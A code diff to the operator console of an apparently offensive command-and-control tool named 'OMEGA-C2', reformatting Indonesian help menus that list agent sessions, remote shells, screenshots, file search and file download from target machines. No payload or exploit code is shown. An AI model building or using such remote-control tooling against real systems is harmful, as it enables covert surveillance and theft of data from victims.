@@ -13,6 +13,7 @@
 #include <algorithm>
 #include "../../common/utils.h"
 
+
 #ifdef _WIN32
 #include <windows.h>
 #endif
@@ -241,15 +242,25 @@ void CommandCenter() {
                 break;
             }
         } else if (input == "help") {
-            std::cout << "\n" << CYAN << BOLD   << " ╔═══════════════════════════════════════════════════════════════════╗" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ║ " << WHITE << "OMEGA-C2 COMMAND OPERATIONS" << CYAN << "                                       ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ╠═══════════════════════════════════════════════════════════════════╣" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "sessions        " << RESET << " : Lihat semua agen yang aktif terhubung      " << CYAN << BOLD << "    ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "interact <id>   " << RESET << " : Masuk ke mode interaktif shell remote      " << CYAN << BOLD << "    ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "kill <id>       " << RESET << " : Hentikan agen target                       " << CYAN << BOLD << "    ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "tunnel status   " << RESET << " : Status konektivitas tunnel                 " << CYAN << BOLD << "    ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "shutdown        " << RESET << " : Hentikan total seluruh layanan C2          " << CYAN << BOLD << "    ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD           << " ╚═══════════════════════════════════════════════════════════════════╝" << RESET << std::endl;
+                std::cout << "\n" << CYAN << BOLD 
+                        << "OMEGA-C2 COMMAND OPERATIONS" 
+                        << RESET << std::endl;
+
+                std::cout << YELLOW << "sessions        " << RESET 
+                        << ": Lihat semua agen yang aktif terhubung" << std::endl;
+
+                std::cout << YELLOW << "interact <id>   " << RESET 
+                        << ": Masuk ke mode interaktif shell remote" << std::endl;
+
+                std::cout << YELLOW << "kill <id>       " << RESET 
+                        << ": Hentikan agen target" << std::endl;
+
+                std::cout << YELLOW << "tunnel status   " << RESET 
+                        << ": Status konektivitas tunnel" << std::endl;
+
+                std::cout << YELLOW << "shutdown        " << RESET 
+                        << ": Hentikan total seluruh layanan C2" << std::endl;
+                        
         } else if (input == "clear" || input == "cls") {
             #ifdef _WIN32
             ClearConsole();
@@ -297,19 +308,26 @@ void InteractLoop(int session_id) {
         if (cmd.empty()) continue;
         if (cmd == "background" || cmd == "back") break;
         if (cmd == "help") {
-            std::cout << "\n" << CYAN << BOLD << "  ╔═══════════════════════════════════════════════════════════════════╗" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << WHITE << "AGENT INTERACTION COMMANDS" << CYAN << "                                ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ╠═══════════════════════════════════════════════════════════════════╣" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "tasks           " << RESET << ": Daftar proses aktif                        " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "stop <pid/name> " << RESET << ": Menghentikan proses target                 " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "drives          " << RESET << ": Daftar drive & kapasitas                   " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << ":screenshot     " << RESET << ": Ambil tangkapan layar target               " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << ":sysinfo        " << RESET << ": Informasi hardware & OS detail             " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << ":search <pola>  " << RESET << ": Cari file rekursif (misal: *.txt)          " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "upload <L> <R>  " << RESET << ": Unggah file lokal ke agen                  " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "download <path> " << RESET << ": Unduh file dari komputer agen              " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "background      " << RESET << ": Kembali ke menu utama                      " << CYAN << BOLD << " ║" << RESET << std::endl;
-            std::cout << CYAN << BOLD << "  ╚═══════════════════════════════════════════════════════════════════╝" << RESET << std::endl;
+
+            std::cout << "\n" << CYAN << BOLD 
+                    << "=== AGENT INTERACTION COMMANDS ===" 
+                    << RESET << "\n" << std::endl;
+
+            auto print_cmd = [](std::string cmd, std::string desc) {
+                std::cout << YELLOW << std::left << std::setw(18) << cmd 
+                        << RESET << ": " << desc << std::endl;
+            };
+
+            print_cmd("tasks", "Daftar proses aktif");
+            print_cmd("stop <pid/name>", "Menghentikan proses target");
+            print_cmd("drives", "Daftar drive & kapasitas");
+            print_cmd(":screenshot", "Ambil tangkapan layar target");
+            print_cmd(":sysinfo", "Informasi hardware & OS detail");
+            print_cmd(":search <pola>", "Cari file rekursif (misal: *.txt)");
+            print_cmd("upload <L> <R>", "Unggah file lokal ke agen");
+            print_cmd("download <path>", "Unduh file dari komputer agen");
+            print_cmd("background", "Kembali ke menu utama");
+
             continue;
         }
 
